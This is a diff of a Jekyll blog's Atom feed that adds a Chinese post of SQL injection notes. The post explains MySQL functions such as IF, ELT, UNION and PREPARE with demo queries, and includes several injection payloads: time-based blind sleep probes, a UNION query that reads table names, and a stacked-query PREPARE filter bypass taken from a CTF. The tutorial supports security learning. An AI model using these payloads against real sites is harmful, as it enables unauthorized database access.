@@ -1,4 +1,511 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-08T10:39:54+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">SQL注入-堆叠注入</title><link href="http://localhost:4000/blog/sqli-stacked-queries/" rel="alternate" type="text/html" title="SQL注入-堆叠注入" /><published>2020-04-08T10:10:57+08:00</published><updated>2020-04-08T10:10:57+08:00</updated><id>http://localhost:4000/blog/sqli-stacked-queries</id><content type="html" xml:base="http://localhost:4000/blog/sqli-stacked-queries/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-10T16:53:09+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">SQL注入-一些小trick</title><link href="http://localhost:4000/blog/sqli-trick/" rel="alternate" type="text/html" title="SQL注入-一些小trick" /><published>2020-04-10T16:47:23+08:00</published><updated>2020-04-10T16:47:23+08:00</updated><id>http://localhost:4000/blog/sqli-trick</id><content type="html" xml:base="http://localhost:4000/blog/sqli-trick/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#一些解释&quot; id=&quot;markdown-toc-一些解释&quot;&gt;一些解释&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#ifexpr1expr2expr3&quot; id=&quot;markdown-toc-ifexpr1expr2expr3&quot;&gt;IF(expr1,expr2,expr3)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#ifnullexpr1expr2&quot; id=&quot;markdown-toc-ifnullexpr1expr2&quot;&gt;IFNULL(expr1,expr2)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#eltnstr1str2&quot; id=&quot;markdown-toc-eltnstr1str2&quot;&gt;ELT(N,str1,str2,…)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#fieldstrstr1str2&quot; id=&quot;markdown-toc-fieldstrstr1str2&quot;&gt;FIELD(str,str1,str2,…)&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#别名&quot; id=&quot;markdown-toc-别名&quot;&gt;别名&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#cast&quot; id=&quot;markdown-toc-cast&quot;&gt;CAST&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#concatconcat_wsgroup_concat&quot; id=&quot;markdown-toc-concatconcat_wsgroup_concat&quot;&gt;CONCAT&amp;amp;CONCAT_WS&amp;amp;GROUP_CONCAT&lt;/a&gt;        &lt;ul&gt;
+          &lt;li&gt;&lt;a href=&quot;#concat&quot; id=&quot;markdown-toc-concat&quot;&gt;CONCAT&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#concat_ws&quot; id=&quot;markdown-toc-concat_ws&quot;&gt;CONCAT_WS&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#group_concat&quot; id=&quot;markdown-toc-group_concat&quot;&gt;GROUP_CONCAT&lt;/a&gt;&lt;/li&gt;
+          &lt;li&gt;&lt;a href=&quot;#group_concatconcat_ws&quot; id=&quot;markdown-toc-group_concatconcat_ws&quot;&gt;GROUP_CONCAT+CONCAT_WS&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#order-by&quot; id=&quot;markdown-toc-order-by&quot;&gt;ORDER BY&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#union&quot; id=&quot;markdown-toc-union&quot;&gt;UNION&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#prepare&quot; id=&quot;markdown-toc-prepare&quot;&gt;PREPARE&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;通过一些见到的用过的payload，总结一些常见的SQL注入用到的技巧，这样比过一遍SQL所有函数效率高一点吧，等足够多放不下的时候，再想一下怎么分类吧，或者因为懒就一直这样堆着也挺好(●’◡’●)&lt;/p&gt;
+
+&lt;h1 id=&quot;一些解释&quot;&gt;一些解释&lt;/h1&gt;
+
+&lt;h2 id=&quot;ifexpr1expr2expr3&quot;&gt;IF(expr1,expr2,expr3)&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果expr1是TRUE，则IF()的返回值为expr2；否则返回值为expr3，IF()返回值为数字值或字符串。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname;
++---------+-----------+-----+
+| Vorname | Nachname  | Alt |
++---------+-----------+-----+
+| Lina    | Schneider |  22 |
+| Lara    | Zhang     |  20 |
+| Patric  | Wang      |  23 |
+| Tobias  | Ai        |  22 |
++---------+-----------+-----+
+4 rows in set (0.00 sec)
+
+mysql&amp;gt; select if(Alt=22,'yes','no')'22_or_not' from vorname;
++-----------+
+| 22_or_not |
++-----------+
+| yes       |
+| no        |
+| no        |
+| yes       |
++-----------+
+4 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;看别人说&lt;strong&gt;if&lt;/strong&gt;就像是开关，也可以说是分流，通过判断决定返回值，感觉很形象啊。&lt;/p&gt;
+
+&lt;p&gt;尝试在&lt;strong&gt;if&lt;/strong&gt;判断中加入延时，Lina22岁sleep2秒，Tobias22岁，加起来4秒&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select if(Alt=22,sleep(2),'not_22')'22_or_not' from vorname;
++-----------+
+| 22_or_not |
++-----------+
+| 0         |
+| not_22    |
+| not_22    |
+| 0         |
++-----------+
+4 rows in set (4.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;🤳这里的&lt;strong&gt;22_or_not&lt;/strong&gt;是别名&lt;/p&gt;
+
+&lt;p&gt;贴一个时间盲注payload来自忘记哪里，判断数据库名称的长度&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=2) and if(length(database())=6,sleep(5),null);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ifnullexpr1expr2&quot;&gt;IFNULL(expr1,expr2)&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;expr1&lt;/strong&gt;不为&lt;strong&gt;NULL&lt;/strong&gt;，返回值就是&lt;strong&gt;expr1&lt;/strong&gt;，否则返回值为&lt;strong&gt;expr2&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select ifnull(1,9);
++-------------+
+| ifnull(1,9) |
++-------------+
+|           1 |
++-------------+
+1 row in set (0.00 sec)
+mysql&amp;gt; select ifnull(null,9);
++----------------+
+| ifnull(null,9) |
++----------------+
+|              9 |
++----------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;贴一个时间盲注payload来自忘记哪里&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id = -2441 OR (ORD(MID((SELECT IFNULL(CAST(FirstName AS CHAR),0x20) FROM user ORDER BY id LIMIT 1,1),2,1))&amp;gt;112)#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;eltnstr1str2&quot;&gt;ELT(N,str1,str2,…)&lt;/h2&gt;
+
+&lt;p&gt;如果&lt;strong&gt;N=1&lt;/strong&gt;返回&lt;strong&gt;str1&lt;/strong&gt;，如果&lt;strong&gt;N=2&lt;/strong&gt;返回&lt;strong&gt;str2&lt;/strong&gt;，如果参数的数量小于&lt;strong&gt;1&lt;/strong&gt;或大于&lt;strong&gt;N&lt;/strong&gt;，返回&lt;strong&gt;NULL&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname='Lina' and elt(1,sleep(1));
+Empty set (1.00 sec)
+
+mysql&amp;gt; select * from vorname where Vorname='Lina' and elt(1,sleep(1));
+Empty set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;用的时候加上&lt;strong&gt;and短路运算规则&lt;/strong&gt;可以进行时间盲注&lt;/p&gt;
+
+&lt;h2 id=&quot;fieldstrstr1str2&quot;&gt;FIELD(str,str1,str2,…)&lt;/h2&gt;
+
+&lt;p&gt;与&lt;strong&gt;ELT&lt;/strong&gt;互补，在&lt;strong&gt;str1&lt;/strong&gt;，&lt;strong&gt;str2&lt;/strong&gt;中寻找&lt;strong&gt;str&lt;/strong&gt;，返回找到的下标&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Vorname='Lina' and field(0,sleep(1));
++---------+-----------+-----+
+| Vorname | Nachname  | Alt |
++---------+-----------+-----+
+| Lina    | Schneider |  22 |
++---------+-----------+-----+
+1 row in set (1.00 sec)
+
+mysql&amp;gt; select * from vorname where Vorname='Lina' and field(1,sleep(1));
+Empty set (1.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;用的时候加上&lt;strong&gt;and短路运算规则&lt;/strong&gt;可以进行时间盲注&lt;/p&gt;
+
+&lt;h2 id=&quot;别名&quot;&gt;别名&lt;/h2&gt;
+
+&lt;p&gt;有个优点应该就是，防止列名太长，或可以给未知列名起名字，也就是无列名注入&lt;/p&gt;
+
+&lt;p&gt;🤳其中as可以省略&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select if(Alt=22,'yes','no') from vorname;
++-----------------------+
+| if(Alt=22,'yes','no') |
++-----------------------+
+| yes                   |
+| no                    |
+| no                    |
+| yes                   |
++-----------------------+
+4 rows in set (0.00 sec)
+
+
+mysql&amp;gt; select if(Alt=22,'yes','no') as '22_or_not' from vorname;
++-----------+
+| 22_or_not |
++-----------+
+| yes       |
+| no        |
+| no        |
+| yes       |
++-----------+
+4 rows in set (0.00 sec)
+
+
+mysql&amp;gt; select if(Alt=22,'yes','no')'22_or_not' from vorname;
++-----------+
+| 22_or_not |
++-----------+
+| yes       |
+| no        |
+| no        |
+| yes       |
++-----------+
+4 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;payload来自xray，其中的a是别名&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=7'and(select*from(select+sleep(2))a/**/union/**/select+1)='
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/web/190266.html&quot;&gt;这个人&lt;/a&gt;很骚，好尝试了别名嵌套&lt;/p&gt;
+
+&lt;p&gt;select ‘1’;&lt;/p&gt;
+
+&lt;p&gt;select * from(select ‘1’)a;&lt;/p&gt;
+
+&lt;p&gt;select * from(select * from(select ‘1’)a)a;……&lt;/p&gt;
+
+&lt;p&gt;能套64层w(ﾟДﾟ)w&lt;/p&gt;
+
+&lt;h2 id=&quot;cast&quot;&gt;CAST&lt;/h2&gt;
+
+&lt;p&gt;CAST函数用于将某种数据类型的表达式显式转换为另一种数据类型&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Format&lt;/th&gt;
+      &lt;th&gt;Definition&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DATE&lt;/td&gt;
+      &lt;td&gt;日期&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;TIME&lt;/td&gt;
+      &lt;td&gt;时间&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DATETIME&lt;/td&gt;
+      &lt;td&gt;日期时间型&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;DECIMAL&lt;/td&gt;
+      &lt;td&gt;浮点数&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CHAR&lt;/td&gt;
+      &lt;td&gt;字符型，可带参数&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select cast(12 as decimal);
++---------------------+
+| cast(12 as decimal) |
++---------------------+
+|                  12 |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select cast('' as decimal);
++---------------------+
+| cast('' as decimal) |
++---------------------+
+|                   0 |
++---------------------+
+1 row in set, 1 warning (0.00 sec)
+
+mysql&amp;gt; select cast('12' as decimal);
++-----------------------+
+| cast('12' as decimal) |
++-----------------------+
+|                    12 |
++-----------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select cast(now() as char);
++---------------------+
+| cast(now() as char) |
++---------------------+
+| 2020-03-26 14:58:35 |
++---------------------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select cast(database() as char);
++--------------------------+
+| cast(database() as char) |
++--------------------------+
+| test                     |
++--------------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;concatconcat_wsgroup_concat&quot;&gt;CONCAT&amp;amp;CONCAT_WS&amp;amp;GROUP_CONCAT&lt;/h2&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Function&lt;/th&gt;
+      &lt;th&gt;Differences&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;concat(str1,str2,…)&lt;/td&gt;
+      &lt;td&gt;没有分隔符地连接字符串&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;concat_ws(separator,str1,str2,…)&lt;/td&gt;
+      &lt;td&gt;含有分隔符地连接字符串&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;group_concat(str1,str2,…)&lt;/td&gt;
+      &lt;td&gt;连接一个组的所有字符串，并以逗号分隔每一条数据&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&quot;concat&quot;&gt;CONCAT&lt;/h3&gt;
+
+&lt;p&gt;没有分隔符地连接字符串&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select concat(Vorname,'~',Nachname) from vorname;
++------------------------------+
+| concat(Vorname,'~',Nachname) |
++------------------------------+
+| Lina~Schneider               |
+| Lara~Zhang                   |
+| Patric~Wang                  |
+| Tobias~Ai                    |
++------------------------------+
+4 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;concat_ws&quot;&gt;CONCAT_WS&lt;/h3&gt;
+
+&lt;p&gt;含有分隔符地连接字符串&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select concat_ws('~',Vorname,Alt) from vorname;
++----------------------------+
+| concat_ws('~',Vorname,Alt) |
++----------------------------+
+| Lina~22                    |
+| Lara~20                    |
+| Patric~23                  |
+| Tobias~22                  |
++----------------------------+
+4 rows in set (0.00 sec)
+
+mysql&amp;gt; select concat_ws('~',Vorname,Nachname,Alt) from vorname;
++-------------------------------------+
+| concat_ws('~',Vorname,Nachname,Alt) |
++-------------------------------------+
+| Lina~Schneider~22                   |
+| Lara~Zhang~20                       |
+| Patric~Wang~23                      |
+| Tobias~Ai~22                        |
++-------------------------------------+
+4 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;group_concat&quot;&gt;GROUP_CONCAT&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select group_concat(Vorname,'~',Nachname),Alt from vorname group by Alt;
++------------------------------------+-----+
+| group_concat(Vorname,'~',Nachname) | Alt |
++------------------------------------+-----+
+| Lara~Zhang                         |  20 |
+| Lina~Schneider,Tobias~Ai           |  22 |
+| Patric~Wang                        |  23 |
++------------------------------------+-----+
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;常见的union联合查询注入语句，读取当前数据库的所有表名&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;group_concatconcat_ws&quot;&gt;GROUP_CONCAT+CONCAT_WS&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select group_concat(concat_ws('~',Vorname,Nachname)order by Nachname),Alt from vorname group by Alt;
++----------------------------------------------------------------+-----+
+| group_concat(concat_ws('~',Vorname,Nachname)order by Nachname) | Alt |
++----------------------------------------------------------------+-----+
+| Lara~Zhang                                                     |  20 |
+| Tobias~Ai,Lina~Schneider                                       |  22 |
+| Patric~Wang                                                    |  23 |
++----------------------------------------------------------------+-----+
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;order-by&quot;&gt;ORDER BY&lt;/h2&gt;
+
+&lt;p&gt;sql注入的教程里经常第一步是&lt;strong&gt;order by&lt;/strong&gt;，好多地方会叫&lt;strong&gt;显示位&lt;/strong&gt;，那原理是什么呢？&lt;/p&gt;
+
+&lt;p&gt;效果如下，如果数据表一共有3列，当&lt;strong&gt;order by 4&lt;/strong&gt;时，提示没有第四列&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 order by 1;   
++---------+-----------+-----+                           
+| Vorname | Nachname  | Alt |                           
++---------+-----------+-----+                           
+| Lina    | Schneider |  22 |                           
+| Tobias  | Ai        |  22 |                           
++---------+-----------+-----+                           
+2 rows in set (0.00 sec)  
+
+mysql&amp;gt; select * from vorname where Alt=22 order by 2;   
++---------+-----------+-----+                           
+| Vorname | Nachname  | Alt |                           
++---------+-----------+-----+                           
+| Tobias  | Ai        |  22 |                           
+| Lina    | Schneider |  22 |                           
++---------+-----------+-----+                           
+2 rows in set (0.00 sec)                                
+                                                        
+mysql&amp;gt; select * from vorname where Alt=22 order by 3;   
++---------+-----------+-----+                           
+| Vorname | Nachname  | Alt |                           
++---------+-----------+-----+                           
+| Lina    | Schneider |  22 |                           
+| Tobias  | Ai        |  22 |                           
++---------+-----------+-----+                           
+2 rows in set (0.00 sec)                                
+                                                        
+mysql&amp;gt; select * from vorname where Alt=22 order by 4;   
+ERROR 1054 (42S22): Unknown column '4' in 'order clause'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;order by&lt;/strong&gt;原理是排序，&lt;strong&gt;order by 1&lt;/strong&gt;就是以第一列排序，Lina在Tobias之前，&lt;strong&gt;order by 2&lt;/strong&gt;是以第二列排序，Ai在Schneider之前，&lt;strong&gt;order by 4&lt;/strong&gt;就出错辣，因为没有第四列。因此在注入的第一步可以用来判断表的列数，这个也为大多数sql注入的后一步做铺垫，因为UNION语句需要前后两个的列数相同。&lt;/p&gt;
+
+&lt;h2 id=&quot;union&quot;&gt;UNION&lt;/h2&gt;
+
+&lt;p&gt;前面说UNION语句需要前后两个的列数相同，效果如下，只有union前后为相同的列数，才不会出错&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 union select 1;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+mysql&amp;gt; select * from vorname where Alt=22 union select 1,2;
+ERROR 1222 (21000): The used SELECT statements have a different number of columns
+mysql&amp;gt; select * from vorname where Alt=22 union select 1,2,3;
++---------+-----------+-----+
+| Vorname | Nachname  | Alt |
++---------+-----------+-----+
+| Lina    | Schneider |  22 |
+| Tobias  | Ai        |  22 |
+| 1       | 2         |   3 |
++---------+-----------+-----+
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在union后一段中的第三列获取该数据库的用户名&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; select * from vorname where Alt=22 union select 1,2,user();
++---------+-----------+----------------+
+| Vorname | Nachname  | Alt            |
++---------+-----------+----------------+
+| Lina    | Schneider | 22             |
+| Tobias  | Ai        | 22             |
+| 1       | 2         | root@localhost |
++---------+-----------+----------------+
+3 rows in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;prepare&quot;&gt;PREPARE&lt;/h2&gt;
+
+&lt;p&gt;MYSQL的预处理语句由PREPARE、EXECUTE、DEALLOCATE组成&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PREPARE stmt_name FROM preparable_stmt
+
+EXECUTE stmt_name [USING @var_name [,@var_name]...]
+
+{DEALLOCATE|DROP} PREPARE stmt_name
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;实例&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mysql&amp;gt; prepare pr1 from 'select ?+?';
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
+mysql&amp;gt; set @a=1,@b=10;
+Query OK, 0 rows affected (0.00 sec)
+
+mysql&amp;gt; execute pr1 using @a,@b;
++------+
+| ?+?  |
++------+
+|   11 |
++------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; execute pr1 using @a,@a;
++------+
+| ?+?  |
++------+
+|    2 |
++------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; execute pr1 using 1,2;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1,2' at line 1
+
+mysql&amp;gt; deallocate prepare pr1;
+Query OK, 0 rows affected (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;过程大致如上，👌准备一条语句，命名为&lt;strong&gt;pr1&lt;/strong&gt;，内容为&lt;strong&gt;‘select ?+?’&lt;/strong&gt;，&lt;strong&gt;‘select ?+?’&lt;/strong&gt;里的&lt;strong&gt;？&lt;/strong&gt;是用来占位的。设置变量&lt;strong&gt;a&lt;/strong&gt;和&lt;strong&gt;b&lt;/strong&gt;；👌&lt;strong&gt;execute&lt;/strong&gt;来执行命名为&lt;strong&gt;pr1&lt;/strong&gt;的语句，使用变量&lt;strong&gt;a&lt;/strong&gt;和&lt;strong&gt;b&lt;/strong&gt;，不可以是&lt;strong&gt;1&lt;/strong&gt;和&lt;strong&gt;2&lt;/strong&gt;这样的数字；👌&lt;strong&gt;deallocate&lt;/strong&gt;释放执行中使用的数据库资源&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;意义&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;✍可以减少每次执行SQL语法分析，比如&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PREPARE stmt1 FROM 'SELECT productCode, productName
+                    FROM products
+                    WHERE productCode = ?';
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;之后只需要&lt;strong&gt;set&lt;/strong&gt;不同的&lt;strong&gt;productCode&lt;/strong&gt;值，再&lt;strong&gt;execute&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;✍可以在关键词被过滤的时候拼接关键词进行绕过，比如看到的一个可以堆叠注入的payload&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1';use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;✍防止SQL注入（关于问号占位符可以防止注入的事情，有搜出来好多东西，有空再整理学习一下（吗&lt;/p&gt;
+
+&lt;h1 id=&quot;refer&quot;&gt;Refer&lt;/h1&gt;
+
+&lt;p&gt;&lt;a href=&quot;shenmedoumeiyou&quot;&gt;https://xz.aliyun.com/t/5505&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;dianjibunengtiaozhuan&quot;&gt;https://www.k0rz3n.com/2019/02/21/一篇文章带你深入理解 SQL 盲注/&lt;/a&gt;&lt;/p&gt;</content><author><name>true</name></author><category term="SQL注入" /><summary type="html"></summary></entry><entry><title type="html">SQL注入-堆叠注入</title><link href="http://localhost:4000/blog/sqli-stacked-queries/" rel="alternate" type="text/html" title="SQL注入-堆叠注入" /><published>2020-04-08T10:10:57+08:00</published><updated>2020-04-08T10:10:57+08:00</updated><id>http://localhost:4000/blog/sqli-stacked-queries</id><content type="html" xml:base="http://localhost:4000/blog/sqli-stacked-queries/">&lt;ul id=&quot;markdown-toc&quot;&gt;
   &lt;li&gt;&lt;a href=&quot;#stacked-queries&quot; id=&quot;markdown-toc-stacked-queries&quot;&gt;Stacked Queries&lt;/a&gt;    &lt;ul&gt;
       &lt;li&gt;&lt;a href=&quot;#principle&quot; id=&quot;markdown-toc-principle&quot;&gt;Principle&lt;/a&gt;&lt;/li&gt;
